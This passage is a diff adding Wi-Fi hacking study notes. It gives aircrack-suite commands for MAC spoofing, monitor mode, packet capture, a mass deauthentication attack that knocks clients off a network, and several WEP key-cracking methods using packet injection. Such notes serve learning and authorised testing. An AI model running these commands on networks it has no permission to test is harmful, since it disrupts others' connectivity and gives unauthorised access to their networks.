@@ -1,0 +1,184 @@
+***************** -D wlan0
+
+sudo ip link set wlan0 down
+sudo iw wlan0 set monitor none
+sudo ip link set wlan0 up
+
+Change Mac Address:
+
+Method 1:
+
+>ifconfig wlan0 down
+>iwconfig wlan0 hw ether 00:11:22:33:44:55
+>ifconfig wlan0 up
+
+Method 2:
+
+>ifconfig wlan0 down
+>macchanger --help
+>macchanger --random wlan0
+>ifconfig wlan0 up
+
+
+
+
+Managed Mode to Monitor Mode:
+
+If it is managed mode then we are going to get those packets only
+which consists my MAC address .
+
+And if it is monitor mode then we are going to capture all the packets.
+
+Method 1:
+
+>iwconfig
+>airmon-ng start wlan0 (to change managed to mon)
+>iwconfig
+>airmon-ng stop wlan0 (to change again mon to managed)
+
+Method 2:
+
+>ifconfig wlan0 down
+>airmon-ng check kill
+>iwconfig wlan0 mode monitor
+>ifconfig wlan0 up
+>airodump-ng wlan0
+
+Method 3: (This method works in every case)
+
+>ifconfig wlan0 down
+>iwconfig wlan0 mode monitor
+>ifconfig wlan0 up
+
+Begin:
+
+Description:
+>airodump-ng is a packet sniffer.
+>It is used to capture all packets within range.
+>Display detailed info about network arround us.
+
+>airodump-ng wlan0
+>airodump-ng --channel (num) --bssid (mac addrs) --write test wlan0
+
+>>>Here we got some files containing all the packets that been shared between 
+   the router and the clients but they are encrypted.
+
+
+
+DEAUTHENTICATION ATTACK:
+
+>This attack is used to disconnect any device from any network
+within our range even if the network is protected with a key.
+
+>Hacker sends deauthentication packets to the router pretending to be the target
+machine (by spoofing its MAC address).
+
+>At the same time, the hacker sends packets to the target machine
+(pretending to be the router) telling it that it needs to re-autenticate itself.
+
+COMMAND>>aireplay-ng --deauth 100000000 -a (router mac) -c (target mac) wlan0
+
+
+
+B.GAINING ACCESS:
+
+WEP Cracking:
+
+>WEP is Wired Equivalent privacy
+>It is an old encryption.
+>An algorithm that WEP uses is RC4
+>wep is still used in some networks
+>and it can be cracked easily
+
+>>>>Client encrypt the data using key and an encrypted packet is
+sent in the air and Router decrypts packet using the key.
+
+Proper working of WEP:
+
+>Each packet is encrypted using a unique key stream
+>and to generate a key stream IV (initialization Vector) is used
+>The IV is of only 24bit
+>*IV+key(password)=key stream
+
+and the IV is sent with each packet to ensure that every packet has
+its key stream.
+
+Now when the encrypted packet sent to the router then the router needs to decrypt that,
+>and to decrypty it, router needs the same process,it requires the IV and the password which the router
+already knows and IV is already sent with each packet
+
+>>so here the drawback is that the IV is sent in a plain text and is of only 24bit,which is very easy to crack.
+
+>>Result: >IVs will repeat on busy networks.
+          >This makes WEP vulnerable to statistical attacks.
+          >Repeated IVs can be used to determine the key stream   
+          >and break the encryption.
+
+1.WEP CRACKING BASICS:
+
+1.Capture large number of packets/IVs ==using airodump-ng
+2.Analyse he capture IVs and crack the key  ==using aircrack-ng
+ 
+Step 1:
+>airodump-ng wlan0
+>airodump-ng --channel (target channel) --bssid (router IP) --write (file name) wlan0
+>aircrack-ng (cap file)
+
+2.WEP CRACKING:
+
+Problem:
+ >If network is not busy
+ >It would take some time to capture enough IVs
+
+Solution:
+
+ >Force the AP to generate new IVs 
+
+>Basically any network dont accept the request of any host which is
+not inside its network.
+>So here we request the network to not ignore my request,by the 
+following mwthods,
+   >airodump-ng wlan0
+   >airodump-ng --channel (target channel) --bssid (router MAC) --write (file name) wlan0
+   >aireplay-ng --fakeauth 0 -a (mac of router n/w) -h (mac of my usb) wlan0
+
+   >aireplay-ng --arpreplay -b (mac of target n/w) -h (mac of my usb) wlan0
+
+(>After running this command my usb will wait for the arp request 
+>and once my usb receive the arp packet 
+>then it will re-transmit it) and that is how we increase the data
+
+   >aircrack-ng (cap file)
+
+SECOND METHOD to generate the traffic:
+
+>airodump-ng --channel (target channel) --bssid (router MAC) --write (file name) wlan0
+>aireplay-ng --fakeauth 0 -a (mac of router n/w) -h (mac of my usb) wlan0
+>aireplay-ng --chopchop -b (mac of router n/w) -h (mac of my usb) wlan0
+>packetforge-ng -0 -a (mac of router n/w) -h (mac of my usb) -k 255.255.255.255 -l 255.255.255.255 -y (name of keystream) -w (any name)
+>aireplay-ng -2 -r (file(any name)) wlan0
+>aircrack-ng (file name)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
